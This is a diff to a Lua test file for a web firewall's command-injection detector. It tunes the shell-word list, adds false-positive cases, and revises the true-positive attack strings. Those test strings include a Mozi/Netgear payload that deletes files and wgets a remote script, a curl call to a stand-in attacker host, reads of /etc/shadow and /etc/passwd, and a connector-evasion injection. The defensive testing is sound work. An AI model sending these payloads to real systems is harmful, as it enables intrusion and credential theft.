@@ -1369,10 +1369,18 @@ end
 -- ── Test 70: detect_cmd_param_key — generic dispatchers value-aware ────────
 -- 2026-05 log review FPs: WP plugins / themes legitimately use cmd= /
 -- system= / command= as verb selectors (elFinder cmd=open, LWS WooRewards
--- system=rewards, auto-parts visualizer command=viewres). The detector now
+-- system=rewards, auto-parts visualizer command=viewres). The detector
 -- requires the value to look shelly (metachars or shell-command word)
 -- before firing on these three generic keys; PHP-function keys (exec=,
 -- passthru=, shell_exec=, eval=, assert=) still fire on key alone.
+--
+-- Audit F14 narrowed the shell-word list and the tokeniser: (1) hyphen is no
+-- longer a token separator, so compound identifiers (`host-01`, `item-id`)
+-- don't shatter into bare shell words; (2) ubiquitous words (id, ls, ps, w,
+-- pwd, env, cat, head, tail, less, more, host, fetch, route, ping, dig, arp)
+-- were removed as legit-value collisions. Consequence: a bare, un-metachar'd
+-- recon probe (`cmd=id`, `system=ls`) no longer fires — its weaponized form
+-- (`cat /etc/passwd`, `id;`) still does, via the metachar/path checks.
 do
   disable_all_rules()
   waf.set_rule("rule_cmd_params", "challenge")
@@ -1386,6 +1394,24 @@ do
     {"command=viewres&target=inf&fon=ffffff",  "auto-parts visualiser"},
     {"cmd=login",                              "generic dispatcher: cmd=login"},
     {"system=us-east-1",                       "generic dispatcher: system=region"},
+    -- F14: compound identifiers no longer shatter on `-` into bare shell words.
+    {"system=host-01",                         "F14: hostname-like system=host-01"},
+    {"command=item-id",                        "F14: identifier command=item-id"},
+    -- Pure hyphen-tokeniser guard: `ssh` is STILL a listed word, so this fails
+    -- pre-fix (ssh-key -> {ssh,key} -> ssh) and passes only because `-` is no
+    -- longer a separator. `ssh-key` is a common legit management value.
+    {"system=ssh-key",                         "F14: hyphen guard system=ssh-key (ssh kept)"},
+    -- F14: ubiquitous words removed from the shell-word list.
+    {"command=more",                           "F14: pagination command=more"},
+    {"system=host",                            "F14: system=host (hostname field)"},
+    {"system=env&val=prod",                    "F14: env selector system=env"},
+    {"command=cat",                            "F14: category command=cat"},
+    {"command=fetch",                          "F14: JS command=fetch"},
+    {"command=head&n=10",                      "F14: command=head (list head)"},
+    -- F14: bare, un-metachar'd recon probes are intentionally no longer flagged
+    -- (weaponized forms still fire — see the metachar/path TP cases below).
+    {"cmd=id",                                 "F14: bare cmd=id (weaponized id; still fires)"},
+    {"system=ls",                              "F14: bare system=ls"},
     -- Joomla K2 media manager / elFinder: cmd=<verb> where the verb (rm /
     -- ls / mkdir / chmod) collides with a shell-command name. With
     -- task=connector present and a pristine verb, must NOT challenge — else
@@ -1407,21 +1433,23 @@ do
 
   -- Real attacks — MUST fire.
   local tp_cases = {
-    {"cmd=id",                                 "CMD_CMD",       "cmd=id"},
     {"cmd=whoami",                             "CMD_CMD",       "cmd=whoami"},
     {"cmd=uname",                              "CMD_CMD",       "cmd=uname"},
     {"todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.2.3.4/m.sh",
                                                "CMD_CMD",       "Mozi/Netgear setup.cgi"},
-    {"cmd=ls+/etc",                            "CMD_CMD",       "cmd=ls /etc"},
     {"cmd=`whoami`",                           "CMD_CMD",       "cmd backtick"},
-    {"system=id",                              "CMD_SYSTEM",    "system=id"},
+    -- F14: the dropped recon words are still caught in weaponized form — a
+    -- metacharacter or a path makes value_looks_shelly fire regardless of the
+    -- word list, so only the bare probe is lost.
+    {"system=id;whoami",                       "CMD_SYSTEM",    "F14: weaponized system=id; (metachar)"},
+    {"cmd=cat+/etc/shadow",                    "CMD_CMD",       "F14: weaponized cmd=cat /etc/shadow (path)"},
     {"command=/bin/sh",                        "CMD_COMMAND",   "command=/bin/sh"},
     {"command=curl+http://attacker",           "CMD_COMMAND",   "command=curl+url"},
     -- The elFinder carve-out is gated on task=connector AND a pristine verb,
-    -- so a bare verb without the connector marker, or an injection that adds
-    -- metacharacters / a path / a non-verb word, still fires even with
-    -- task=connector appended as evasion.
-    {"action=mk_file_folder_manager&cmd=ls",   "CMD_CMD",       "bare cmd=ls, no connector"},
+    -- so a still-listed verb (mkdir) without the connector marker, or an
+    -- injection that adds metacharacters / a path / a non-verb word, still
+    -- fires even with task=connector appended as evasion.
+    {"action=mk_file_folder_manager&cmd=mkdir", "CMD_CMD",      "bare cmd=mkdir, no connector"},
     {"task=connector&cmd=rm;cat+/etc/passwd",  "CMD_CMD",       "connector evasion + metachar"},
     {"task=connector&cmd=cat+/etc/passwd",     "CMD_CMD",       "connector evasion + path"},
     -- `task` must be a real key == connector; the marker buried in another
